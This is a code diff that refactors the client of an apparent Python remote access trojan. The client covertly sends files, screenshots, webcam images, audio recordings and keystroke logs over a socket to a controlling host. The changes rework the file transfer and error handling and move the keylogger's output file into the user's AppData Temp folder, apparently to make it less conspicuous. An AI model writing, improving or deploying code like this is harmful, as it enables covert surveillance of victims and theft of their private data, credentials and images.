@@ -59,32 +59,23 @@ class Client(object):
         size = int(struct.unpack('i', self.socket.recv(4))[0])
         return self.socket.recv(size).decode()
 
-    def send_file(self, filename):
-        isfile = os.path.isfile(filename)
-        self.socket.send(struct.pack('i', isfile))
-        if isfile:
-            self.socket.send(struct.pack('i', os.stat(filename).st_size))
-            file = open(filename, 'rb')
+    def send_file(self, file):
+        sz = struct.pack('i', os.stat(file).st_size)
+        self.socket.send(sz)
+        with open(file, 'rb') as f:
             while True:
-                data = file.read(1024)
+                data = f.read(1024)
                 if not data:
                     break
                 self.socket.send(data)
-            file.close()
 
-    def recv_file(self, filename):
-        size = struct.unpack('i', self.socket.recv(4))[0]
-        recv_size = 0
-        file = open(filename, 'wb')
-        while not recv_size == size:
-            if size - recv_size > 1024:
-                data = self.socket.recv(1024)
-                recv_size += len(data)
-            else:
-                data = self.socket.recv(size - recv_size)
-                recv_size = size
-            file.write(data)
-        file.close()
+    def recv_file(self, file):
+        sz = struct.unpack('i', self.socket.recv(4))[0]
+        with open(file, 'wb') as f:
+            while sz:
+                packet = self.socket.recv(sz)
+                sz -= len(packet)
+                f.write(packet)
 
     def recv_commands(self):
         client_util = ClientUtil()
@@ -115,30 +106,61 @@ class Client(object):
 
 class ClientUtil:
     @staticmethod
-    def upload(client_obj, filename):
-        client_obj.recv_file(filename)
+    def upload(client_obj, file):
+        try:
+            client_obj.recv_file(file)
+            client_obj.send('[+] File uploaded successfully')
+        except Exception as exception:
+            client_obj.send('[-] Error: ' + str(exception))
 
     @staticmethod
-    def download(client_obj, filename):
-        client_obj.send_file(filename)
+    def download(client_obj, file):
+        try:
+            isfile = os.path.isfile(file)
+            if isfile:
+                sz = struct.pack('i', os.stat(file).st_size)
+                client_obj.socket.send(sz)
+                try:
+                    client_obj.send_file(file)
+                except Exception as exception:
+                    client_obj.send(str(exception))
+            else:
+                client_obj.socket.send(struct.pack('i', 0))
+        except Exception as exception:
+            client_obj.socket.send(struct.pack('i', -1))
+            client_obj.send('[-] Error: ' + str(exception))
 
     @staticmethod
     def screenshot(client_obj):
-        filename = 'Screenshot.png'
-        pyautogui.screenshot(filename)
-        client_obj.send_file(filename)
+        try:
+            filename = 'Screenshot.png'
+            pyautogui.screenshot(filename)
+        except Exception as exception:
+            client_obj.socket.send(struct.pack('i', -1))
+            client_obj.send('[-] Error: ' + str(exception))
+            return
+        ClientUtil.download(client_obj, filename)
         if os.path.isfile(filename):
             os.remove(filename)
 
     @staticmethod
     def webcam(client_obj):
-        filename = 'Webcam.png'
-        capture = cv2.VideoCapture(0)
-        success, image = capture.read()
-        if success:
-            cv2.imwrite(filename, image)
-            capture.release()
-        client_obj.send_file(filename)
+        try:
+            filename = 'Webcam.png'
+            capture = cv2.VideoCapture(0)
+            success, image = capture.read()
+            if success:
+                cv2.imwrite(filename, image)
+                capture.release()
+            else:
+                client_obj.socket.send(struct.pack('i', -1))
+                client_obj.send('[-] Webcam not found')
+                return
+        except Exception as exception:
+            client_obj.socket.send(struct.pack('i', -1))
+            client_obj.send('[-] Error: ' + str(exception))
+            return
+        ClientUtil.download(client_obj, filename)
         if os.path.isfile(filename):
             os.remove(filename)
 
@@ -347,16 +369,13 @@ class ClientUtil:
 
     @staticmethod
     def keylog_start():
-        try:
-            threading.Thread(target=Keylogger().start, daemon=True).start()
-            return '[+] Keylogger started'
-        except Exception as exception:
-            return '[-] Error: ' + str(exception)
+        threading.Thread(target=Keylogger().start, daemon=True).start()
+        return '[+] Keylogger started'
 
     @staticmethod
     def keylog_stop(client_obj):
-        filename = 'output.txt'
-        client_obj.send_file(filename)
+        filename = os.path.expanduser('~') + os.sep + r'AppData\Local\Temp\output.txt'
+        ClientUtil.download(client_obj, filename)
         if os.path.isfile(filename):
             os.remove(filename)
         subprocess.Popen(os.path.realpath(sys.executable))
@@ -395,12 +414,12 @@ class ClientUtil:
             f.setframerate(RATE)
             f.writeframes(b''.join(frames))
             f.close()
-            client_obj.send_file(filename)
-            if os.path.isfile(filename):
-                os.remove(filename)
-            client_obj.send('[+] Record success')
         except Exception as exception:
+            client_obj.socket.send(struct.pack('i', -1))
             client_obj.send('[-] Error: ' + str(exception))
+        ClientUtil.download(client_obj, filename)
+        if os.path.isfile(filename):
+            os.remove(filename)
 
     @staticmethod
     def replace_files():
@@ -535,7 +554,8 @@ class Keylogger(object):
 
     def __init__(self):
         self.window_name = ''
-        with open('output.txt', 'a') as f:
+        self.file = os.path.expanduser('~') + os.sep + r'AppData\Local\Temp\output.txt'
+        with open(self.file, 'a') as f:
             f.write('\n[+] ' + get_time() + ' Keylogger started' + '\n')
             f.close()
 
@@ -553,7 +573,7 @@ class Keylogger(object):
                     data = event.Key
             else:
                 data = event.Key
-        with open('output.txt', 'a') as f:
+        with open(self.file, 'a') as f:
             if str(event.WindowName) != self.window_name:
                 self.window_name = str(event.WindowName)
                 f.write('\n\n[+] ' + get_time() + '\n' + self.window_name + '\n')
